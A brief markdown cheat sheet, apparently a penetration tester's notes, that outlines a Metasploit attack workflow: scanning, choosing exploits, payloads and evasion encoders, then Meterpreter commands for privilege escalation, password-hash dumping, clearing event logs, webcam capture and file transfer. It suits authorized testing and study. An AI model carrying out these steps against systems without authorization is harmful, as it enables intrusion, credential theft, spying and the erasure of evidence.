# Workflow

* Portscan
* Set vars \(RHOST, RHOSTS, PORTS, LPORT, LHOST\)
* Service scans / banner scans
* Search exploits / choose
  * Info
  * Show options
  * show evasion
  * Show payloads
* Set payload
  * set encoder
  * set nops
* Run exploit
* Shell
  * Upgrade to meterpreter if needed
* Meterpreter
  * getuid
  * use priv
    * getsystem -t 0
    * getuid again
  * if not escalated then background the session
    * use exploit/windows/local/
    * 
  * background
  * cat, cd, pwd, ls
  * clearev \#windows 
  * download \(use \\ on windows path\)
  * execute -f cmd.exe -i -H
  * hashdump
  * ipconfig
  * lpwd, lcd
  * run post/windows/manage/migrate
  * ps
  * search
  * shell
  * upload
  * webcam\_list
  * webcam\_snap
* Post
  * post/windows/gather/enum\_patches
  * 

